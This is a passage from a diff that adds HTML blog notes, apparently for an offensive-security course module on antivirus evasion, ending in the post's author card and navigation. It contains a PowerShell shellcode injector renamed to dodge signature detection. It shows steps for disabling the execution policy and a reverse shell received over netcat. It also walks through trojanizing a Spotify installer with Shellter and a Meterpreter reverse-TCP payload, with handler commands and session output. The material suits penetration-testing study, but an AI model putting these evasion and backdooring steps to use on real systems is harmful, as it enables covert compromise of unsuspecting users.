+&lt;li&gt;Binary files have a more structured data format.&lt;/li&gt;
+&lt;li&gt;To catch mal scripts, AV vendors often rely on static string signatures.&lt;/li&gt;
+&lt;li&gt;Variable names.&lt;/li&gt;
+&lt;li&gt;Function names.&lt;/li&gt;
+&lt;li&gt;To bypass that logic, we can give our variables more generic names.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;$var2 = Add-Type -memberDefinition $code -Name &amp;quot;iWin32&amp;quot; -namespace Win32Functions -passthru;
+
+[Byte[]];   
+[Byte[]] $var1 = 0xfc,0xe8,0x8f,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28
+...
+
+$size = 0x1000;
+
+if ($var1.Length -gt 0x1000) {$size = $var1.Length};
+
+$x = $var2::VirtualAlloc(0,$size,0x3000,0x40);
+
+for ($i=0;$i -le ($var1.Length-1);$i++) {$var2::memset([IntPtr]($x.ToInt32()+$i), $var1[$i], 1)};
+
+$var2::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;We have changed.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Win32&lt;/code&gt; hard-coded class name for the &lt;code&gt;Add-Type&lt;/code&gt; cmdlet to &lt;code&gt;iWin32&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$sc&lt;/code&gt; to &lt;code&gt;$var1&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;$winFunc&lt;/code&gt; to &lt;code&gt;$var2&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Improved to 17/48 on VirusTotal.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Transferred to Win 11 client.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Aviara Quick Scan.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Undetected.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;em&gt;To get sense of the detection rate, we could have uploaded the modified bypass to VirusTotal as well. However, as we learned earlier, this could jeopardize our penetration test as our sample could be analyzed and detected by the more powerful cloud-based machine learning engines.&lt;/em&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Next launch the x86 version of PowerShell.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Run our bypass script.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Analyze the output.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;We receive an error referencing the Execution Policies of the system.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Preventing the script from running.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Referring to MS docs on PowerShell Execution Policy we find that the policy is set on a per user basis, not per system.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;em&gt;Keep in mind that much like anything in Windows, the PowerShell Execution Policy settings can be dictated by one or more Active Directory GPOs. In those cases, it may be necessary to search for additional bypass vectors.&lt;/em&gt;.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;We can attempt to view and change the policy for our user.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;In this case we change the policy globally.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;It can be changed per script using the &lt;code&gt;ExecutionPolicy Bypass&lt;/code&gt; flag when run.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;First, retrieve the current execution policy with;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Get-ExecutionPolicy -Scope CurrentUser&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Then set it to &lt;em&gt;Unrestricted&lt;/em&gt;;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;PS C:\Users\offsec\Desktop&amp;gt; .\meminj.ps1
+.\meminj.ps1 : File C:\Users\offsec\Desktop\meminj.ps1 cannot be loaded because running scripts is disabled on this
+system. For more information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
+At line:1 char:1
++ .\meminj.ps1
++ ~~~~~~~~~~~~
+    + CategoryInfo          : SecurityError: (:) [], PSSecurityException
+    + FullyQualifiedErrorId : UnauthorizedAccess
+PS C:\Users\offsec\Desktop&amp;gt; Get-ExecutionPolicy -Scope CurrentUser
+Undefined
+PS C:\Users\offsec\Desktop&amp;gt; Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
+
+Execution Policy Change
+The execution policy helps protect you from scripts that you do not trust. Changing the execution policy might expose
+you to the security risks described in the about_Execution_Policies help topic at
+https:/go.microsoft.com/fwlink/?LinkID=135170. Do you want to change the execution policy?
+[Y] Yes  [A] Yes to All  [N] No  [L] No to All  [S] Suspend  [?] Help (default is &amp;quot;N&amp;quot;): Y
+PS C:\Users\offsec\Desktop&amp;gt; Get-ExecutionPolicy -Scope CurrentUser
+Unrestricted
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Now we start a local netcat listener and run our scipts.&lt;/li&gt;
+&lt;li&gt;The script executes and we receive a reverse shell.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/av-evasion]
+└─$ nc -nvlp 443            
+listening on [any] 443 ...
+connect to [192.168.45.239] from (UNKNOWN) [192.168.219.62] 52269
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec&amp;gt;whoami
+whoami
+client01\offsec
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Thus, we have evaded Avira AV successfully.&lt;/li&gt;
+&lt;li&gt;Mature orgs implement various ML systems to analyze scripts run on systems.&lt;/li&gt;
+&lt;li&gt;This may require adaptations.&lt;/li&gt;
+&lt;li&gt;With a skilled SOC, the EDR could alert team and render our attack useless in minutes.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;Automating the Process&lt;/h5&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.shellterproject.com/&quot;&gt;Shellter&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Dynamic shellcode injection tool.&lt;/li&gt;
+&lt;li&gt;One of the most popular free tools capable of AV evasion.&lt;/li&gt;
+&lt;li&gt;Uses novel and advanced techniques to to backdoor non-mal exec files with mal payloads.&lt;/li&gt;
+&lt;li&gt;At a high level;&lt;/li&gt;
+&lt;li&gt;Analyzes PE file and exec paths.&lt;/li&gt;
+&lt;li&gt;Determines where it can inject shellcode .&lt;/li&gt;
+&lt;li&gt;Using advanced techniques that can not be easily detected by AV.&lt;/li&gt;
+&lt;li&gt;These include changing PE file section perms, creating new sections, etc.&lt;/li&gt;
+&lt;li&gt;Shellter attempts to use existing PE &lt;a href=&quot;https://en.wikipedia.org/wiki/Portable_Executable#Import_Table&quot;&gt;Import Address Table (IAT)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Located functions used for;&lt;/li&gt;
+&lt;li&gt;Memory allocation.&lt;/li&gt;
+&lt;li&gt;Transfer.&lt;/li&gt;
+&lt;li&gt;Exec of payload.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Shellter Pro (paid) supports 32/64 bit bins, including stealthier features&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Example; attempt to use Shellter to bypass Avira AV.&lt;/li&gt;
+&lt;li&gt;Install shelter &lt;code&gt;apt install shelter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Designed to run on win, install wine &lt;code&gt;apt install wine&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Run &lt;code&gt;shellter&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Shellter can run in Auto or Manual mode.&lt;/li&gt;
+&lt;li&gt;Manual.&lt;/li&gt;
+&lt;li&gt;Tool launches the PE we want to use for injection.&lt;/li&gt;
+&lt;li&gt;Allows manipulation on more granular level.&lt;/li&gt;
+&lt;li&gt;Use this mode to customize the injection process (if auto opts fail)&lt;/li&gt;
+&lt;li&gt;For this example select Auto mode.&lt;/li&gt;
+&lt;li&gt;Select &lt;code&gt;A&lt;/code&gt; at prompt.&lt;/li&gt;
+&lt;li&gt;Select target PE.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;We will use the Win 32 trial exec installer for Spotify&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;In engagement, best to pick new, less scrutinized apps&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;Enter the path of the PE.&lt;/li&gt;
+&lt;li&gt;Shellter backs up the PE first.&lt;/li&gt;
+&lt;li&gt;When Shellter finds a place to inject shellcode it prompts if we want to use Stealth Mode.&lt;/li&gt;
+&lt;li&gt;Attempts to restore the exec flow of the PE.&lt;/li&gt;
+&lt;li&gt;Enable it on our installer.&lt;/li&gt;
+&lt;li&gt;Next select payload.&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Note: to restore exec flow in StealthMode, custom payloads need to terminate by exiting the current thread&lt;/em&gt;.&lt;/li&gt;
+&lt;li&gt;After testing, it seems non-Meterpreter payloads fail to exec under Win 11.&lt;/li&gt;
+&lt;li&gt;Select Meterpreter reverse shell payload that Avira detected at the beginning of this module.&lt;/li&gt;
+&lt;li&gt;Use &lt;code&gt;L&lt;/code&gt; for listed payload.&lt;/li&gt;
+&lt;li&gt;Opt &lt;code&gt;1&lt;/code&gt; for &lt;code&gt;Meterpreter_Reverse_TCP&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Set payload params.&lt;/li&gt;
+&lt;li&gt;Shellter will then inject the payload and attempt to reach the first instruction.&lt;/li&gt;
+&lt;li&gt;Configure out listener on attacking machine.
+ - One liner &lt;code&gt;msfconsole -x &amp;quot;use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.195;set LPORT 443;run;&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Transfer the PE to target.&lt;/li&gt;
+&lt;li&gt;Open Avira and perform quick scan.
+    - No threat detected!&lt;/li&gt;
+&lt;li&gt;Since Shellter obfuscates the payload and decoder before injection, Avira does not detect it as mal.&lt;/li&gt;
+&lt;li&gt;Exec the PE and we are presented with the default Spotify Installer.&lt;ul&gt;
+&lt;li&gt;Return to our multi/handler and we receive a Meterpreter shell!&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;[*] Using configured payload generic/shell_reverse_tcp
+payload =&amp;gt; windows/meterpreter/reverse_tcp
+LHOST =&amp;gt; 192.168.45.195
+LPORT =&amp;gt; 443
+[*] Started reverse TCP handler on 192.168.45.195:443 
+[*] Sending stage (175686 bytes) to 192.168.215.62
+[*] Meterpreter session 1 opened (192.168.45.195:443 -&amp;gt; 192.168.215.62:51235) at 2023-09-29 06:53:57 -0700
+
+meterpreter &amp;gt; shell
+Process 3572 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.22000.675]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\offsec\Desktop&amp;gt;whoami
+whoami
+client01\offsec
+
+C:\Users\offsec\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We have successfully evaded AV with Shellter, bypassed Avira AV, and compromised our target!&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;blog/password-attacks.html&quot;
+        data-default-href=&quot;blog/password-attacks.html&quot;
+        data-default-fragment=&quot;blog/fragments/password-attacks.html&quot;
+        data-fragment-href=&quot;blog/fragments/password-attacks.html&quot;
+        data-target-slug=&quot;password-attacks&quot;
+        data-post-slug=&quot;password-attacks&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 15 — Password Attacks That Still Work&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;blog/fixing-exploits.html&quot;
+        data-default-href=&quot;blog/fixing-exploits.html&quot;
+        data-default-fragment=&quot;blog/fragments/fixing-exploits.html&quot;
+        data-fragment-href=&quot;blog/fragments/fixing-exploits.html&quot;
+        data-target-slug=&quot;fixing-exploits&quot;
+        data-post-slug=&quot;fixing-exploits&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 13 — Repairing Public Exploits&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+</code></pre>
+      </div>
+    </article>
+  
